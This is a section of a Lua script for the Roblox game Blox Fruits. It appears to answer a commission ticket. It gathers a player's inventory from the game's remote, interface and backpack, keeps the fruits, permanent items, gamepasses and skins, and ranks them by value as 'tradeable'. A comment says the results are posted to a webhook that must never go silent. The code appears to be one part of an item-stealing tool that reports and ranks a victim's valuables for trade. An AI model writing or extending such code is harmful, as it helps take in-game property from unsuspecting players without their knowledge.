-- =============================================================================
-- 5. INVENTORY — MULTI-SOURCE  (your ticket #2)
--    Old code only used CommF:InvokeServer("getInventory") and item.Name.
--    Real Blox Fruits item shape varies by version; item.Name is often just
--    "Dragon-Dragon" with Type = "Blox Fruit" but some are {Name=..., Type=...,
--    Count=...}. When CommF returns empty (rate-limited / version drift) the
--    old code silently sent nothing. Now: CommF first, then PlayerGui scan,
--    then Backpack tool scan, then merge + dedupe. If all three are empty
--    we post an embed saying so, so the webhook NEVER goes silent.
-- =============================================================================
local function norm(s) return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "") end

local function invokeCommF(args)
    if not CommF then return nil end
    local ok, r = pcall(function() return CommF:InvokeServer(args) end)
    if ok and type(r) == "table" then return r end
    return nil
end

-- Source A: CommF:InvokeServer("getInventory")
local function invFromCommF()
    local raw = invokeCommF("getInventory") or invokeCommF({ "getInventory" }) or invokeCommF()
    if type(raw) ~= "table" then return {} end
    local out = {}
    for _, v in pairs(raw) do
        if type(v) == "table" and v.Name then
            out[#out + 1] = { Name = tostring(v.Name), Type = tostring(v.Type or ""), Count = tonumber(v.Count) or 1 }
        end
    end
    return out
end

-- Source B: scan PlayerGui inventory frame (Blox Fruits draws items as ImageButtons)
local function invFromPlayerGui()
    local out = {}
    local seen = {}
    if not PG then return out end
    local main = PG:FindFirstChild("Main")
    if not main then return out end
    local inv = main:FindFirstChild("Inventory")
    if not inv then return out end

    for _, d in ipairs(inv:GetDescendants()) do
        if d:IsA("ImageButton") or d:IsA("TextButton") or d:IsA("ImageLabel") then
            local n = tostring(d.Name or "")
            if n ~= "" and n:lower() ~= "frame" and n:lower() ~= "container"
                and not seen[n] then
                seen[n] = true
                local isFruitItem = n:lower():find("fruit", 1, true) ~= nil
                    or n:lower():find("dragon", 1, true) ~= nil
                    or n:lower():find("leopard", 1, true) ~= nil
                    or n:lower():find("kitsune", 1, true) ~= nil
                    or n:lower():find("magnet", 1, true) ~= nil
                    or n:lower():find("control", 1, true) ~= nil
                    or n:lower():find("venom", 1, true) ~= nil
                    or n:lower():find("dough", 1, true) ~= nil
                    or n:lower():find("phoenix", 1, true) ~= nil
                    or n:lower():find("rumble", 1, true) ~= nil
                    or n:lower():find("portal", 1, true) ~= nil
                    or n:lower():find("buddha", 1, true) ~= nil
                if isFruitItem then
                    out[#out + 1] = { Name = n, Type = "Blox Fruit", Count = 1 }
                end
            end
        end
    end
    return out
end

-- Source C: Backpack tool names (fruits held as tools)
local function invFromBackpack()
    local out = {}
    local bp = LP:FindFirstChildOfClass("Backpack")
    if not bp then return out end
    for _, t in ipairs(bp:GetChildren()) do
        if t:IsA("Tool") then
            local n = tostring(t.Name or "")
            if n:lower():find("fruit", 1, true) or n:lower():find("dragon", 1, true)
                or n:lower():find("kitsune", 1, true) or n:lower():find("leopard", 1, true)
                or n:lower():find("magnet", 1, true) or n:lower():find("control", 1, true)
                or n:lower():find("venom", 1, true) or n:lower():find("dough", 1, true) then
                out[#out + 1] = { Name = n, Type = "Blox Fruit", Count = 1 }
            end
        end
    end
    return out
end

-- Merge + dedupe by normalized name
local function getInventory()
    local merged = {}
    local seen = {}
    local sources = { invFromCommF(), invFromPlayerGui(), invFromBackpack() }
    for _, src in ipairs(sources) do
        for _, item in ipairs(src) do
            local key = norm(item.Name)
            if key ~= "" and not seen[key] then
                seen[key] = true
                merged[#merged + 1] = item
            end
        end
    end
    lastInventorySnapshot = merged
    return merged
end

local function isFruit(item)
    if not item then return false end
    if item.Type == "Blox Fruit" then return true end
    local n = norm(item.Name)
    if n:find("fruit", 1, true) then return true end
    local KNOWN = { "dragon","dough","kitsune","leopard","mammoth","t-rex","kitsune",
        "venom","control","spirit","magnet","portal","rumble","phoenix","buddha",
        "love","spider","sound","rubber","light","dark","ice","magma","quake",
        "human","bomb","smoke","spring","blade","flame","bomb","chop","sand",
        "ghost","barrier","revive","paw","gravity","eagle","falcon","rocket","spin" }
    for _, kw in ipairs(KNOWN) do
        if n:find(kw, 1, true) then return true end
    end
    return false
end

local function isPremium(item)
    if not item then return false end
    if item.Type == "Premium" then return true end
    local n = norm(item.Name)
    if n:find("perm", 1, true) or n:find("gamepass", 1, true) then return true end
    for _, kw in ipairs(SKIN_PRIORITY) do if n:find(kw, 1, true) then return true end end
    return false
end

local function priorityRank(item)
    local n = norm(item.Name)
    for i, kw in ipairs(FRUIT_PRIORITY) do if n:find(kw, 1, true) then return i end end
    for i, kw in ipairs(SKIN_PRIORITY) do if n:find(kw, 1, true) then return 100 + i end end
    if n:find("perm", 1, true) or n:find("gamepass", 1, true) then return 500 end
    if item.Type == "Blox Fruit" then return 600 end
    return 999
end

local function collectTradeable()
    local inv = getInventory()
    if not inv or #inv == 0 then return {} end
    local out = {}
    for _, item in ipairs(inv) do
        if isFruit(item) or isPremium(item) then out[#out + 1] = item end
    end
    table.sort(out, function(a, b) return priorityRank(a) < priorityRank(b) end)
    return out
end

